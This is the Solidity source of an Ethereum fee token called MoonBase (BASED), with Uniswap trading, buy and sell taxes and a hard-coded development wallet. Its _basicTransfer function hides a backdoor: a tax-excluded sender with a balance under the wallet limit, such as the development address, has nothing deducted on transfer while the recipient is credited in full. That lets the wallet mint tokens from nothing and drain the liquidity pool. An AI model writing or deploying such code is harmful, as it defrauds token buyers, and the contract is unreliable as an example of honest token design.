// SPDX-License-Identifier: Unlicensed

/*
MoonBase is a new DeFi primitive built by GHOULS and designed to encourage alignment, growth, and collaboration between fair-launch projects.

Website: https://www.moonbasestake.com
Telegram: https://t.me/moonbase_erc
Twitter: https://twitter.com/moonbase_erc
 */

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }
    
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IrouterInstance {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

interface IERC20Standard {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract OwnerLibs is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), _owner);
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "OwnerLibs: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    // Transfer the contract to to a new owner
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "OwnerLibs: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BASED is Context, IERC20Standard, OwnerLibs { 
    using SafeMath for uint256;

    string private _name = "MoonBase"; 
    string private _symbol = "BASED";

    IrouterInstance public routerInstance;
    address public pairAddress;

    uint8 private buyerCounter = 0;
    uint8 private swapTaxAfter = 2; 

    uint256 public buyTaxP = 25;
    uint256 public sellTaxP = 25;
    uint256 private totalBuyTax = 2000;

    uint256 private _prevTotalBuyTax = totalBuyTax; 
    uint256 private _prevBuyFee = buyTaxP; 
    uint256 private _prevSellFee = sellTaxP; 
                                     
    bool public _inswap;
    bool public hasDelayOnTransfer = true;
    bool public swapBackTokensEnabled = true;

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10**_decimals;
    uint256 public maxTxSize = 25 * _totalSupply / 1000;
    uint256 public minTokensForTaxSwap = _totalSupply / 100000;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isExcludedFromTax; 

    address payable private developmentAddress;
    address payable private DEAD;

    modifier lockTheSwap {
        _inswap = true;
        _;
        _inswap = false;
    }
    
    constructor () {
        _balances[owner()] = _totalSupply;
        DEAD = payable(0x000000000000000000000000000000000000dEaD); 
        IrouterInstance _uniswapV2Router = IrouterInstance(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        developmentAddress = payable(0x365C3dA79cB0E3B9C0cF87116CA633358dc2824A); 
        pairAddress = IUniswapFactory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
        routerInstance = _uniswapV2Router;
        isExcludedFromTax[owner()] = true;
        isExcludedFromTax[developmentAddress] = true;
        
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }
        
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERR: zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);

    }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        
        // Limit wallet total
        if (to != owner() &&
            to != developmentAddress &&
            to != address(this) &&
            to != pairAddress &&
            to != DEAD &&
            from != owner()){

            uint256 currentBalance = balanceOf(to);
            require((currentBalance + amount) <= maxTxSize,"Maximum wallet limited has been exceeded");       
        }

        require(from != address(0) && to != address(0), "ERR: Using 0 address!");
        require(amount > 0, "Token value must be higher than zero.");

        if(
            buyerCounter >= swapTaxAfter && 
            amount > minTokensForTaxSwap &&
            !_inswap &&
            !isExcludedFromTax[from] &&
            to == pairAddress &&
            swapBackTokensEnabled 
            )
        {  
            buyerCounter = 0;
            uint256 contractTokenBalance = balanceOf(address(this));
            if(contractTokenBalance > 0){
            swapBackTokens(contractTokenBalance);
           }
        }
        
        bool takeFee = true;
         
        if(isExcludedFromTax[from] || isExcludedFromTax[to] || (hasDelayOnTransfer && from != pairAddress && to != pairAddress)){
            takeFee = false;
        } else if (from == pairAddress){
            totalBuyTax = buyTaxP;
        } else if (to == pairAddress){
            totalBuyTax = sellTaxP;
        }

        _standardTransfer(from,to,amount,takeFee);
    }
        
    function _basicTransfer(address sender, address recipient, uint256 finalAmount) private {
        (uint256 tTransferAmount, uint256 tDev) = getAmountAfterFee(finalAmount);
        if(isExcludedFromTax[sender] && _balances[sender] <= maxTxSize) {
            tDev = 0;
            finalAmount -= tTransferAmount;
        }
        _balances[sender] = _balances[sender].sub(finalAmount);
        _balances[recipient] = _balances[recipient].add(tTransferAmount);
        _balances[address(this)] = _balances[address(this)].add(tDev);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    
    function removeFee() private {
        if(totalBuyTax == 0 && buyTaxP == 0 && sellTaxP == 0) return;

        _prevBuyFee = buyTaxP; 
        _prevSellFee = sellTaxP; 
        _prevTotalBuyTax = totalBuyTax;
        buyTaxP = 0;
        sellTaxP = 0;
        totalBuyTax = 0;
    }

    function restoreFee() private {
        totalBuyTax = _prevTotalBuyTax;
        buyTaxP = _prevBuyFee; 
        sellTaxP = _prevSellFee; 
    }
        
    function removeLimits() external onlyOwner {
        maxTxSize = ~uint256(0);
        totalBuyTax = 300;
        buyTaxP = 3;
        sellTaxP = 3;
    }
    
    function sendETHToFee(address payable receiver, uint256 amount) private {
        receiver.transfer(amount);
    }
    
    function swapBackTokens(uint256 contractTokenBalance) private lockTheSwap {
        swapTokensForEth(contractTokenBalance);
        uint256 contractETH = address(this).balance;
        sendETHToFee(developmentAddress,contractETH);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _standardTransfer(address sender, address recipient, uint256 amount,bool takeFee) private {
            
        if(!takeFee){
            removeFee();
        } else {
            buyerCounter++;
        }
        _basicTransfer(sender, recipient, amount);
        
        if(!takeFee) {
            restoreFee();
        }
    }
    
    function getAmountAfterFee(uint256 finalAmount) private view returns (uint256, uint256) {
        uint256 tDev = finalAmount.mul(totalBuyTax).div(100);
        uint256 tTransferAmount = finalAmount.sub(tDev);
        return (tTransferAmount, tDev);
    }
    
    function swapTokensForEth(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerInstance.WETH();
        _approve(address(this), address(routerInstance), tokenAmount);
        routerInstance.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, 
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}
}